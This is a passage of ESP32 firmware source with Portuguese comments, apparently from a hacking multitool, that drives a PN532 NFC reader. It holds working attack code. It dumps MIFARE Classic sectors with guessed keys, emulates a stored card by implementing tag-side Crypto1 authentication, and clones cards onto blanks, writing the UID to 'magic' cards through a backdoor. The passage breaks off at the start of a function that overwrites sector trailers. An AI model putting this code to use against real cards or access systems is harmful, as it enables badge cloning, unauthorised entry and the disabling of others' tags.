            s_nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, u2, &ul2, 60);
            Serial.printf("DUMP: s%u leitura falhou -> cartao re-selecionado\n", (unsigned)s);
          }
          Serial.printf("DUMP: setor %u key %c = %02X%02X%02X%02X%02X%02X lidos=%d\n",
                        (unsigned)s, (slot == 2) ? 'B' : 'A', k[0], k[1], k[2], k[3], k[4], k[5],
                        nread);
        }
      }
      Serial.printf("DUMP: chaves %d/16 (testadas %d)\n", keyed, candIdx);

      // Nada abriu: so ai vale re-listar para saber se o cartao esta na bobina.
      if (keyed == 0) {
        const bool presentNow = rfidTagStillPresent(uid, uidLen);
        Serial.printf("DUMP: 0 chaves, cartao presente=%d\n", (int)presentNow);
        if (!presentNow) {
          rfidDynamicBand(0, "Cartao saiu", "Aproxime e repita");
          rfidPrint("[!] Cartao saiu da bobina. Repetindo...", UI_WARN, false);
          delay(600);
          continue;
        }
      }

      // Reparo: setores com chave mas sem os 4 blocos.
      bool stopped = false;
      for (int pass = 0; pass < 3; pass++) {
        int missing = 0;
        for (uint8_t s = 0; s < 16; s++) {
          if (!c.secSlot[s] || (gotMask & (uint16_t)(1u << s))) continue;
          missing++;
          if (rfidPumpSessionUi() || rfidPollCancel()) {
            stopped = true;
            break;
          }
          char l2[40];
          snprintf(l2, sizeof(l2), "Setor %u (passada %d)", (unsigned)s, pass + 1);
          rfidDynamicBand(0, "Lendo cartao", l2);
          if (mfcReadSector(uid, uidLen, s, c.secKey[s], &c.secSlot[s], c.data[s])) {
            gotMask |= (uint16_t)(1u << s);
          } else {
            Serial.printf("DUMP: s%u falhou (passada %d)\n", (unsigned)s, pass + 1);
          }
        }
        int done = 0;
        for (uint8_t s = 0; s < 16; s++) {
          if (gotMask & (uint16_t)(1u << s)) done++;
        }
        Serial.printf("DUMP: passada %d -> %d/16 lidos\n", pass + 1, done);
        if (stopped || missing == 0 || done >= 16) break;
      }
      dumpOk = ((gotMask == 0xFFFFu) && !stopped);
      for (uint8_t s = 0; s < 16; s++) {
        if (!c.secSlot[s]) {
          Serial.printf("DUMP: setor %u sem chave\n", (unsigned)s);
        } else if (!(gotMask & (uint16_t)(1u << s))) {
          Serial.printf("DUMP: setor %u com chave, sem leitura\n", (unsigned)s);
        }
      }
    }
    break;
  }
  c.dumpOk = dumpOk ? 1 : 0;

  // ------- 2) Nome automatico (o teclado aqui reiniciava o DIV) -------
  Serial.printf("DUMP: heap depois do dump = %u\n", (unsigned)ESP.getFreeHeap());
  char newName[16];
  memset(newName, 0, sizeof(newName));
  for (int i = 1; i <= 99; i++) {
    snprintf(newName, sizeof(newName), "Cartao %d", i);
    if (vaultFindByName(newName) < 0) break;
  }
  strncpy(c.name, newName, sizeof(c.name) - 1);
  s_vaultCount++;
  vaultSort();
  {
    const int idx = vaultFindByName(newName);
    s_vaultSel = (idx >= 0) ? idx : (s_vaultCount - 1);
  }
  vaultSave();
  Serial.printf("DUMP: salvo '%s' dumpOk=%d keyed=%d\n", newName, (int)dumpOk, keyed);

  char msg[220];
  if (dumpOk) {
    snprintf(msg, sizeof(msg), "%s\n%d/16 setores lidos.\nRenomeie em Lista > View > CIMA.",
             newName, keyed);
    rfidResultAndDismiss("Ler cartao", "Cartao salvo", msg);
  } else {
    snprintf(msg, sizeof(msg), "%s\n%d/16 setores com chave.\nOs outros usam chave propria.",
             newName, keyed);
    rfidResultAndDismiss("Ler cartao", "Dump parcial", msg);
  }
  return true;
}

static void vaultInfo() {
  if (s_vaultSel < 0 || s_vaultSel >= s_vaultCount) return;
  VaultCard& c = s_vault[s_vaultSel];
  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), c.uid, c.uidLen);
  char body[128];
  snprintf(body, sizeof(body), "UID: %s\nTipo: ISO14443A\n\nEmula o UID no modo target.", uidStr);
  rfidResultAndDismiss("Cartao", c.name, body);
}

// ================= Emulacao completa do Mifare Classic (fase 2) =================

/** Inicia o estado Crypto1 do cartao: key + (nt XOR uid4). */
static void mfcTagAuthBegin(const uint8_t key[6], uint32_t uid4, uint32_t nt, Crypto1State* st) {
  uint64_t k = 0;
  for (int i = 0; i < 6; i++) k = (k << 8) | key[i];
  crypto1_create(st, k);
  crypto1_word(st, nt ^ uid4, 0);
}

/** Processa o desafio {nr}{ar} (8 bytes). Preenche at[4] se o ar confere. */
static bool mfcTagAuthChallenge(Crypto1State* st, uint32_t nt, const uint8_t enc8[8],
                                uint8_t at[4]) {
  for (int i = 0; i < 4; i++) {
    (void)crypto1_byte(st, enc8[i], 1);  // decodifica {nr} (so sincroniza o estado)
  }
  uint8_t ar[4];
  for (int i = 0; i < 4; i++) {
    ar[i] = (uint8_t)(crypto1_byte(st, enc8[4 + i], 1) ^ enc8[4 + i]);
  }
  // ar esperado = suc(nt): suc32 + 4x suc8
  uint32_t expect = crypto1_prng_successor(nt, 32);
  for (int i = 0; i < 4; i++) {
    expect = crypto1_prng_successor(expect, 8);
    if (ar[i] != (uint8_t)(expect & 0xff)) return false;
  }
  // at = suc96(nt); {at} = ks3 ^ at (estado alimenta 0, como o leitor)
  const uint32_t atPlain = crypto1_prng_successor(expect, 32);
  const uint32_t ks3 = crypto1_word(st, 0, 0);
  const uint32_t atEnc = ks3 ^ atPlain;
  for (int i = 0; i < 4; i++) at[i] = (uint8_t)(atEnc >> (8 * (3 - i)));
  return true;
}

static uint8_t mfcCryptByte(Crypto1State* st, uint8_t b, bool enc) {
  return enc ? (uint8_t)(crypto1_byte(st, b, 0) ^ b) : (uint8_t)(crypto1_byte(st, b, 1) ^ b);
}

static uint16_t rfidIso14443Crc(const uint8_t* data, uint8_t n) {
  uint16_t crc = 0x6363;
  for (uint8_t i = 0; i < n; i++) {
    crc ^= data[i];
    for (int b = 0; b < 8; b++) {
      crc = (crc & 1) ? (uint16_t)((crc >> 1) ^ 0x8408) : (uint16_t)(crc >> 1);
    }
  }
  return crc;
}

static void vaultEmulate() {
  if (s_vaultSel < 0 || s_vaultSel >= s_vaultCount) return;
  VaultCard& c = s_vault[s_vaultSel];
  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), c.uid, c.uidLen);
  rfidAttachBus();
  s_nfc.setTargetUid(c.uid, c.uidLen);

  const bool full = (c.dumpOk != 0) && (c.uidLen >= 4);
  Serial.printf("EMUL: UID=%s dumpOk=%d emulacao=%s\n", uidStr, (int)c.dumpOk,
                full ? "COMPLETA" : "so UID");
  rfidShellProgress("Emular", "Aguardando leitor...", "Parar", nullptr);
  rfidSetFeatureInfo("Emular", "");
  rfidSetListenNavLabels("Parar", false);

  const uint32_t uid4 = ((uint32_t)c.uid[0] << 24) | ((uint32_t)c.uid[1] << 16) |
                        ((uint32_t)c.uid[2] << 8) | c.uid[3];
  const uint32_t nt = 0x6E746371u;  // nonce fixo ("ntcq")
  Crypto1State st;
  bool authed = false;
  bool armed = s_nfc.AsTarget();
  Serial.printf("EMUL: AsTarget=%d\n", (int)armed);

  uint8_t rx[64];
  uint8_t rxLen = sizeof(rx);
  uint8_t lastRx0 = 0xFF;
  uint32_t lastRxLogMs = 0;

  for (;;) {
    if (rfidPumpSessionUi()) break;
    if (rfidPollCancel()) break;
    rxLen = sizeof(rx);
    if (!s_nfc.getDataTarget(rx, &rxLen)) {
      delay(5);
      continue;
    }
    if (rxLen == 0) continue;

    // Log com limite de taxa: so quando o comando muda ou a cada 1,5 s.
    if (rx[0] != lastRx0 || (uint32_t)(millis() - lastRxLogMs) > 1500UL) {
      lastRx0 = rx[0];
      lastRxLogMs = millis();
      Serial.printf("EMUL RX(%u):", (unsigned)rxLen);
      for (uint8_t i = 0; i < rxLen && i < 24; i++) Serial.printf(" %02X", rx[i]);
      Serial.println();
    }

    if (!full) {
      rfidTargetSendResponse(c.uid, c.uidLen);
      continue;
    }

    if (!authed) {
      if (rx[0] == 0x60 || rx[0] == 0x61) {
        const uint8_t blk = rx[1];
        const uint8_t sec = blk / 4;
        uint8_t key[6];
        if (sec < 16 && c.secSlot[sec]) memcpy(key, c.secKey[sec], 6);
        else memset(key, 0xFF, 6);
        Serial.printf("EMUL: AUTH cmd=%02X blk=%u sec=%u slot=%u\n", (unsigned)rx[0],
                      (unsigned)blk, (unsigned)sec, (unsigned)c.secSlot[sec]);
        mfcTagAuthBegin(key, uid4, nt, &st);
        uint8_t ntBuf[4] = {(uint8_t)(nt >> 24), (uint8_t)(nt >> 16), (uint8_t)(nt >> 8),
                            (uint8_t)nt};
        rfidTargetSendResponse(ntBuf, 4);

        // espera o desafio {nr}{ar} (8 bytes)
        bool got = false;
        const unsigned long t0 = millis();
        while (millis() - t0 < 900UL) {
          if (rfidPumpSessionUi() || rfidPollCancel()) break;
          rxLen = sizeof(rx);
          if (s_nfc.getDataTarget(rx, &rxLen)) {
            Serial.printf("EMUL: desafio(%u):", (unsigned)rxLen);
            for (uint8_t i = 0; i < rxLen && i < 8; i++) Serial.printf(" %02X", rx[i]);
            Serial.println();
            if (rxLen >= 8) {
              got = true;
              break;
            }
          }
        }
        if (!got) {
          Serial.println("EMUL: desafio nao chegou (rearmando)");
          s_nfc.AsTarget();
          continue;
        }
        uint8_t at[4];
        if (mfcTagAuthChallenge(&st, nt, rx, at)) {
          rfidTargetSendResponse(at, 4);
          authed = true;
          Serial.println("EMUL: AUTENTICADO, at enviado");
          rfidDynamicBand(0, "Emulando", "Autenticado");
        } else {
          Serial.println("EMUL: ar invalido (chave errada?) — rearmando");
          s_nfc.AsTarget();
        }
      } else if (rxLen == 1 && (rx[0] == 0x26 || rx[0] == 0x25 || rx[0] == 0x52 ||
                                rx[0] == 0x51 || rx[0] == 0x53)) {
        // REQA/WUPA: o DIV responde a anticolisao ele mesmo.
        const uint8_t atqa[2] = {0x04, 0x00};
        rfidTargetSendResponse(atqa, 2);
        Serial.println("EMUL: REQA -> ATQA 0400");
      } else if (rx[0] == 0x93 && rxLen >= 2 && rx[1] == 0x20) {
        // SELECT CL1 (cascade 1): responde UID(4) + BCC
        uint8_t sel[5];
        memcpy(sel, c.uid, 4);
        sel[4] = (uint8_t)(0x88 ^ c.uid[0] ^ c.uid[1] ^ c.uid[2]);
        rfidTargetSendResponse(sel, 5);
        Serial.println("EMUL: SELECT CL1 -> UID+BCC");
      } else if (rx[0] == 0x93 && rxLen >= 8 && rx[1] == 0x70) {
        // SELECT CL1 completo: responde SAK + CRC
        const uint8_t sak = 0x08;
        const uint16_t crc = rfidIso14443Crc(&sak, 1);
        const uint8_t resp[3] = {sak, (uint8_t)(crc & 0xff), (uint8_t)(crc >> 8)};
        rfidTargetSendResponse(resp, 3);
        Serial.println("EMUL: SELECT completo -> SAK 08 + CRC");
      } else if (rx[0] == 0x50 && rxLen >= 2) {
        Serial.println("EMUL: HALT (pre-auth)");
      } else {
        Serial.printf("EMUL: frame pre-auth nao tratado (%02X)\n", (unsigned)rx[0]);
      }
    } else {
      // Comandos cifrados: decifra byte a byte.
      const uint8_t plain0 = mfcCryptByte(&st, rx[0], false);
      if (plain0 == 0x30 && rxLen >= 2) {  // READ
        const uint8_t blk = mfcCryptByte(&st, rx[1], false);
        // consome os 2 bytes de CRC (do frame ou calculados) p/ manter sincronia
        const uint8_t crcIn[2] = {plain0, blk};
        const uint16_t crc = rfidIso14443Crc(crcIn, 2);
        if (rxLen >= 4) {
          (void)mfcCryptByte(&st, rx[2], false);
          (void)mfcCryptByte(&st, rx[3], false);
        } else {
          (void)mfcCryptByte(&st, (uint8_t)(crc & 0xff), false);
          (void)mfcCryptByte(&st, (uint8_t)(crc >> 8), false);
        }
        const uint8_t sec = (blk / 4) & 0x0F;
        Serial.printf("EMUL: READ blk=%u sec=%u\n", (unsigned)blk, (unsigned)sec);
        uint8_t* d = c.data[sec][blk % 4];
        uint8_t out[16];
        for (int i = 0; i < 16; i++) out[i] = mfcCryptByte(&st, d[i], true);
        rfidTargetSendResponse(out, 16);
      } else if (plain0 == 0x50 || plain0 == 0x52) {  // HALT
        (void)mfcCryptByte(&st, rx[1], false);
        if (rxLen >= 4) {
          (void)mfcCryptByte(&st, rx[2], false);
          (void)mfcCryptByte(&st, rx[3], false);
        }
        Serial.println("EMUL: HALT (rearmando)");
        authed = false;
        s_nfc.AsTarget();
      } else if (plain0 == 0xA0) {  // WRITE: responde ACK de 4 bits (0x0A)
        Serial.println("EMUL: WRITE — responde ACK");
        const uint8_t ack = 0x0A;
        rfidTargetSendResponse(&ack, 1);
      } else {
        Serial.printf("EMUL: cmd %02X nao tratado (rearmando)\n", (unsigned)plain0);
        authed = false;
        s_nfc.AsTarget();
      }
    }
    delay(2);
  }

  s_nfc.SAMConfig();
  s_nfc.setPassiveActivationRetries(0xFF);
  rfidRestoreBus();
  if (rfidSessionExitRequested()) return;
  rfidResultAndDismiss("Emular", "Parado", "Sessao encerrada.");
}

void sessionClone2() {
  vaultLoad();
  s_rfidUiDrawn = false;
  int page = 0;  // 0=main, 1=list, 2=view

  vaultSetNavMain();
  vaultDrawMain();
  rfidRedrawNavChrome();

  for (;;) {
    if (rfidPumpSessionUi()) break;

    const bool left = isButtonPressed(BTN_LEFT);
    const bool select = isButtonPressed(BTN_SELECT);
    const bool right = isButtonPressed(BTN_RIGHT);
    const bool up = isButtonPressed(BTN_UP);
    const bool down = isButtonPressed(BTN_DOWN);

    if (left) {
      rfidReleaseNavButtons();
      if (page == 2) {
        page = 1;
        vaultSetNavList();
        vaultDrawList();
        rfidRedrawNavChrome();
      } else if (page == 1) {
        page = 0;
        vaultSetNavMain();
        vaultDrawMain();
        rfidRedrawNavChrome();
      } else {
        break;
      }
      continue;
    }

    if (page == 0) {
      if (select) {
        rfidReleaseNavButtons();
        if (vaultRead()) {
          page = 1;
          vaultSetNavList();
          vaultDrawList();
          rfidRedrawNavChrome();
        } else {
          vaultDrawMain();
          rfidRedrawNavChrome();
        }
        continue;
      }
      if (right) {
        rfidReleaseNavButtons();
        page = 1;
        vaultSetNavList();
        vaultDrawList();
        rfidRedrawNavChrome();
        continue;
      }
    } else if (page == 1) {
      if (up) {
        rfidReleaseNavButtons();
        if (s_vaultCount > 0) {
          s_vaultSel = (s_vaultSel - 1 + s_vaultCount) % s_vaultCount;
          vaultDrawList();
        }
        continue;
      }
      if (down) {
        rfidReleaseNavButtons();
        if (s_vaultCount > 0) {
          s_vaultSel = (s_vaultSel + 1) % s_vaultCount;
          vaultDrawList();
        }
        continue;
      }
      if (right) {
        rfidReleaseNavButtons();
        if (s_vaultCount > 0) {
          page = 2;
          vaultSetNavView();
          vaultDrawView();
          rfidRedrawNavChrome();
        }
        continue;
      }
      if (select) {
        rfidReleaseNavButtons();
        vaultEmulate();
        vaultDrawList();
        rfidRedrawNavChrome();
        continue;
      }
    } else {
      if (up) {
        rfidReleaseNavButtons();
        vaultRename();
        vaultDrawView();
        rfidRedrawNavChrome();
        continue;
      }
      if (down) {
        rfidReleaseNavButtons();
        if (rfidRunTwoBoxConfirm("Clone Card 2", "Apagar cartao?",
                                 s_vault[s_vaultSel].name,
                                 "O cartao sera removido da lista.",
                                 "Confirma a exclusao deste cartao?", "Apagar")) {
          vaultDelete();
          page = 1;
          vaultSetNavList();
          vaultDrawList();
          rfidRedrawNavChrome();
        } else {
          vaultDrawView();
          rfidRedrawNavChrome();
        }
        continue;
      }
    }
    delay(10);
  }

  setTouchNavLabels(nullptr, nullptr, nullptr, nullptr, nullptr);
  rfidRestoreBus();
}

void sessionCardReader() {
  static const char kIntro[] =
      "Passive ISO14443A read.\n\n"
      "Hold the tag flat on the coil. UID, tag type, and memory samples appear here after scan.";

  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  rfidAttachBus();

  if (!rfidListenIso14443a("Card Reader", "Cancel", uid, &uidLength,
                           (unsigned long)RFID_TAG_LISTEN_TIMEOUT_MS,
                           "Listening — present ISO14443A tag", kIntro)) {
    rfidRestoreBus();
    return;
  }

  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  CardType ct = detectCardType(uid, uidLength);

  char classicBlk[200] = "";
  if (ct == MIFARE_CLASSIC) {
    uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t data[16];
    if (s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, keyA) &&
        s_nfc.mifareclassic_ReadDataBlock(0, data)) {
      formatClassicBlock0(classicBlk, sizeof(classicBlk), data);
    } else {
      snprintf(classicBlk, sizeof(classicBlk),
               "Sector 0 block 0 was not readable using default key A (FF FF FF FF FF FF).");
    }
  }

  char ulSample[240] = "";
  if (ct == MIFARE_ULTRALIGHT || ct == NTAG) {
    uint8_t pg[4][4];
    bool ok = true;
    for (int pi = 0; pi < 4; pi++) {
      if (!s_nfc.mifareultralight_ReadPage((uint8_t)(4 + pi), pg[pi])) {
        ok = false;
      }
    }
    if (ok) {
      snprintf(ulSample, sizeof(ulSample),
               "User memory sample (pages 4–7, 4 bytes each):\n"
               "P4  %02X %02X %02X %02X\n"
               "P5  %02X %02X %02X %02X\n"
               "P6  %02X %02X %02X %02X\n"
               "P7  %02X %02X %02X %02X",
               pg[0][0], pg[0][1], pg[0][2], pg[0][3], pg[1][0], pg[1][1], pg[1][2], pg[1][3],
               pg[2][0], pg[2][1], pg[2][2], pg[2][3], pg[3][0], pg[3][1], pg[3][2], pg[3][3]);
    } else {
      snprintf(ulSample, sizeof(ulSample), "Pages 4–7 could not all be read.");
    }
  }

  const char* fw = s_pn532VerStr[0] ? s_pn532VerStr : "PN532 (version not cached)";
  char body[640];
  snprintf(body, sizeof(body),
           "Reader IC: %s\n\n"
           "UID (hex): %s\n"
           "UID length: %u bytes\n"
           "Detected type: %s\n"
           "Type code (internal): %d\n",
           fw, uidStr, (unsigned)uidLength, cardTypeStr(ct), (int)ct);

  if (ct == MIFARE_CLASSIC && classicBlk[0]) {
    size_t len = strlen(body);
    snprintf(body + len, sizeof(body) - len, "\n%s", classicBlk);
  }
  if ((ct == MIFARE_ULTRALIGHT || ct == NTAG) && ulSample[0]) {
    size_t len = strlen(body);
    snprintf(body + len, sizeof(body) - len, "\n\n%s", ulSample);
  }
  if (ct == MIFARE_DESFIRE) {
    size_t len = strlen(body);
    snprintf(body + len, sizeof(body) - len, "\n\n"
             "DESFire / ISO-DEP-style tag detected.\n"
             "This tool only dumps UID here; full DESFire ops need other APDUs.");
  }
  if (ct == UNKNOWN) {
    size_t len = strlen(body);
    snprintf(body + len, sizeof(body) - len, "\n\n"
             "Family could not be determined from quick probes.");
  }

  rfidRestoreBus();

  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Tag detected", uidStr);
  rfidPrint(String("[+] ") + cardTypeStr(ct) + "  " + uidStr, UI_OK, false);
  if (ct == MIFARE_CLASSIC && classicBlk[0]) {
    rfidPrint(classicBlk, UI_DIM_TEXT, false);
  }
  (void)body;
  rfidWaitTwoBoxDismiss();
}

static uint8_t s_srcData[16][3][16];
static uint8_t s_srcPages[ESP32DIV_RFID_SRC_PAGES][4];

void sessionClone() {
  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t keyB[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t keyZero[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t data[16];
  uint8_t srcUidCopy[7];

#if RFID_UID_CLONE
  const char* introFoot =
      "Default keys (A/B) and zero.\nUID byte clone on Gen2 \"magic\" cards when detected.";
#else
  const char* introFoot = "Default keys (A/B) and zero. UID block may stay factory.";
#endif

  char introBody[220];
  snprintf(introBody, sizeof(introBody),
           "Two-tag flow: read source, confirm, then write a blank of the same type.\n\n%s\n\n"
           "Step 1/4: present the SOURCE tag on the coil.",
           introFoot);

  rfidAttachBus();
  if (!rfidListenIso14443a("Clone", "Cancel", uid, &uidLength,
                           (unsigned long)RFID_CLONE_PHASE_TIMEOUT_MS,
                           "Step 1/4 — Present SOURCE tag", introBody)) {
    rfidRestoreBus();
    return;
  }

  memcpy(srcUidCopy, uid, uidLength);
  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Source tag detected", uidStr);
  rfidPrint(String("[+] Source ") + uidStr, UI_OK, false);

  CardType srcType = detectCardType(uid, uidLength);
  if (srcType == UNKNOWN) {
    rfidRestoreBus();
    rfidResultAndDismiss("Clone", "Unsupported", "Could not classify tag.\nNeed Classic, Ultralight, or NTAG.");
    return;
  }

  memset(s_srcData, 0, sizeof(s_srcData));
  memset(s_srcPages, 0, sizeof(s_srcPages));
  bool readOk = true;

  if (srcType == MIFARE_CLASSIC) {
    rfidTransitionToProgress("Clone", "Step 2/4 — Read source", "Cancel",
                             "Reading source Classic data blocks 0–47.");
    for (uint8_t sector = 0; sector < 16 && readOk; sector++) {
      char l1[48];
      char l2[48];
      snprintf(l1, sizeof(l1), "Classic — reading data blocks");
      snprintf(l2, sizeof(l2), "Sector %u / 15", (unsigned)sector);
      rfidDynamicBand(RF_DYN_TOP_PROG, l1, l2);
      char infoLine[64];
      snprintf(infoLine, sizeof(infoLine), "Reading sector %u of 15.", (unsigned)sector);
      rfidRefreshInfoPanel("PROGRESS", infoLine);
      if (rfidPollCancel()) {
        rfidRestoreBus();
        return;
      }
      for (uint8_t block = 0; block < 3; block++) {
        uint8_t blockNum = (uint8_t)(sector * 4 + block);
        bool auth =
            s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, blockNum, 0, keyA);
        if (!auth) {
          auth = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, blockNum, 1, keyB);
        }
        if (auth) {
          if (s_nfc.mifareclassic_ReadDataBlock(blockNum, data)) {
            memcpy(s_srcData[sector][block], data, 16);
          } else {
            readOk = false;
          }
        } else {
          readOk = false;
        }
        delay(18);
      }
    }
  } else if (srcType == MIFARE_ULTRALIGHT || srcType == NTAG) {
    uint8_t maxPages = (srcType == MIFARE_ULTRALIGHT) ? 16u : 36u;
    rfidTransitionToProgress("Clone", "Step 2/4 — Read source", "Cancel",
                             "Reading source Ultralight / NTAG user pages.");
    for (uint8_t page = 4; page < maxPages; page++) {
      char l2[40];
      snprintf(l2, sizeof(l2), "Page %u / %u", (unsigned)page, (unsigned)(maxPages - 1));
      rfidDynamicBand(RF_DYN_TOP_PROG, "Ultralight / NTAG — user pages", l2);
      char infoLine[64];
      snprintf(infoLine, sizeof(infoLine), "Reading page %u of %u.", (unsigned)page,
               (unsigned)(maxPages - 1));
      rfidRefreshInfoPanel("PROGRESS", infoLine);
      if (rfidPollCancel()) {
        rfidRestoreBus();
        return;
      }
      if (s_nfc.mifareultralight_ReadPage(page, data)) {
        memcpy(s_srcPages[page], data, 4);
      } else {
        readOk = false;
      }
      delay(12);
    }
  }

  rfidRestoreBus();

  if (!readOk) {
    rfidResultAndDismiss("Clone", "Read failed", "Some blocks/pages did not read.\nCheck keys or tag damage.");
    return;
  }

  static const char kConfirmInfo[] =
      "Source data is stored in device memory.\n\n"
      "Remove the source tag from the coil, then tap Clone to present a blank tag "
      "of the same type.\n\n"
      "Back cancels without writing anything.";

  char confirmDetail[56];
  snprintf(confirmDetail, sizeof(confirmDetail), "%s  %s", uidStr, cardTypeStr(srcType));
  char confirmLog[128];
  snprintf(confirmLog, sizeof(confirmLog),
           "[+] Source copied (%s, %s).\n[*] Remove source — tap Clone.",
           uidStr, cardTypeStr(srcType));

  if (!rfidRunTwoBoxConfirm("Clone", "Step 3/4 — Confirm clone", confirmDetail, confirmLog,
                            kConfirmInfo, "Clone")) {
    return;
  }

  static const char kBlankInfo[] =
      "Step 4/4: present a blank tag of the same type as the source.\n\n"
      "Writing starts automatically after the blank tag is detected.";

  rfidAttachBus();
  if (!rfidListenIso14443a("Clone", "Cancel", uid, &uidLength,
                           (unsigned long)RFID_CLONE_PHASE_TIMEOUT_MS,
                           "Step 4/4 — Present BLANK tag", kBlankInfo)) {
    rfidRestoreBus();
    return;
  }

  char blankUidStr[24] = "";
  uidToHex(blankUidStr, sizeof(blankUidStr), uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Blank tag detected", blankUidStr);
  rfidPrint(String("[+] Blank ") + blankUidStr, UI_OK, false);

  CardType blankType = detectCardType(uid, uidLength);
  if (blankType != srcType) {
    rfidRestoreBus();
    rfidResultAndDismiss("Clone", "Type mismatch", "Blank must match source family.");
    return;
  }

  bool cloneOk = true;
  int blocksDone = 0;
#if RFID_UID_CLONE
  bool gen2MagicDetected = false;
#endif

  if (blankType == MIFARE_CLASSIC) {
    bool magic = tryMagicBackdoor();
#if RFID_UID_CLONE
    gen2MagicDetected = magic;
#else
    (void)magic;
#endif
    bool uidWritten = false;
#if RFID_UID_CLONE
    if (magic) {
      bool ok = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, keyA);
      if (!ok) {
        ok = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 1, keyB);
      }
      if (!ok) {
        ok = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, keyZero);
      }
      if (ok) {
        uint8_t block0Data[16];
        memcpy(block0Data, srcUidCopy, uidLength);
        block0Data[4] =
            (uint8_t)(block0Data[0] ^ block0Data[1] ^ block0Data[2] ^ block0Data[3]);
        memcpy(&block0Data[5], &s_srcData[0][0][5], 11);
        if (s_nfc.mifareclassic_WriteDataBlock(0, block0Data)) {
          blocksDone++;
          uidWritten = true;
          // BUGFIX: o UID do cartão mudou para o do source. A autenticação dos
          // setores seguintes precisa usar o UID NOVO, senão tudo falha.
          memcpy(uid, srcUidCopy, uidLength);
        } else {
          cloneOk = false;
        }
      } else {
        cloneOk = false;
      }
    }
#else
    (void)magic;
    (void)uidWritten;
#endif
    rfidTransitionToProgress("Clone", "Writing — Classic", "Cancel",
                             "Writing copied Classic blocks to blank tag.");
    for (uint8_t sector = 0; sector < 16; sector++) {
      char l2[40];
      snprintf(l2, sizeof(l2), "Sector %u / 15", (unsigned)sector);
      rfidDynamicBand(RF_DYN_TOP_PROG, "Writing copied blocks", l2);
      char infoLine[64];
      snprintf(infoLine, sizeof(infoLine), "Writing sector %u of 15.", (unsigned)sector);
      rfidRefreshInfoPanel("PROGRESS", infoLine);
      if (rfidPollCancel()) {
        rfidRestoreBus();
        if (!rfidSessionExitRequested()) {
          rfidResultAndDismiss("Clone", "Stopped", "Clone aborted mid-write.");
        }
        return;
      }
      for (uint8_t block = 0; block < 3; block++) {
        uint8_t blockNum = (uint8_t)(sector * 4 + block);
#if RFID_UID_CLONE
        if (magic && uidWritten && sector == 0 && block == 0) {
          continue;
        }
#endif
        bool auth =
            s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, blockNum, 0, keyA);
        if (!auth) {
          auth = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, blockNum, 1, keyB);
        }
        if (!auth) {
          auth = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, blockNum, 0, keyZero);
        }
        bool wr = false;
        if (auth) {
          wr = s_nfc.mifareclassic_WriteDataBlock(blockNum, s_srcData[sector][block]);
          if (wr) {
            blocksDone++;
          } else {
            cloneOk = false;
          }
        } else {
          cloneOk = false;
        }
        Serial.printf("CLONE s%u b%u auth=%d wr=%d\n", (unsigned)sector,
                      (unsigned)blockNum, (int)auth, (int)wr);
        delay(28);
      }
    }
  } else if (blankType == MIFARE_ULTRALIGHT || blankType == NTAG) {
    uint8_t maxPages = (blankType == MIFARE_ULTRALIGHT) ? 16u : 36u;
    rfidTransitionToProgress("Clone", "Writing — Ultralight / NTAG", "Cancel",
                             "Writing copied pages to blank tag.");
    for (uint8_t page = 4; page < maxPages; page++) {
      char l2[40];
      snprintf(l2, sizeof(l2), "Page %u / %u", (unsigned)page, (unsigned)(maxPages - 1));
      rfidDynamicBand(RF_DYN_TOP_PROG, "Writing copied pages", l2);
      char infoLine[64];
      snprintf(infoLine, sizeof(infoLine), "Writing page %u of %u.", (unsigned)page,
               (unsigned)(maxPages - 1));
      rfidRefreshInfoPanel("PROGRESS", infoLine);
      if (rfidPollCancel()) {
        rfidRestoreBus();
        if (!rfidSessionExitRequested()) {
          rfidResultAndDismiss("Clone", "Stopped", "Clone aborted mid-write.");
        }
        return;
      }
      if (s_nfc.mifareultralight_WritePage(page, s_srcPages[page])) {
        blocksDone++;
      } else {
        cloneOk = false;
      }
      delay(18);
    }
  }

  rfidRestoreBus();

  char summary[512];
  const char* fw = s_pn532VerStr[0] ? s_pn532VerStr : "PN532";
#if RFID_UID_CLONE
  snprintf(summary, sizeof(summary),
           "%s\n\n"
           "Source UID: %s\n"
           "Blank UID:    %s\n"
           "Tag type:     %s\n"
           "Reader IC:    %s\n\n"
           "Approx. write ops OK: %d\n"
           "Gen2 magic UID path: %s",
           cloneOk ? "Clone finished." : "Clone finished with some errors.",
           uidStr, blankUidStr, cardTypeStr(srcType), fw, blocksDone,
           gen2MagicDetected ? "detected (UID block attempted)" : "not detected");
#else
  snprintf(summary, sizeof(summary),
           "%s\n\n"
           "Source UID: %s\n"
           "Blank UID:    %s\n"
           "Tag type:     %s\n"
           "Reader IC:    %s\n\n"
           "Approx. write ops OK: %d",
           cloneOk ? "Clone finished." : "Clone finished with some errors.",
           uidStr, blankUidStr, cardTypeStr(srcType), fw, blocksDone);
#endif

  rfidResultAndDismiss("Clone", "Done", summary);
}

void sessionTagDisrupt() {
  static const char kIntro[] =
      "Writes sector trailer blocks on MIFARE Classic (default key A).\n"
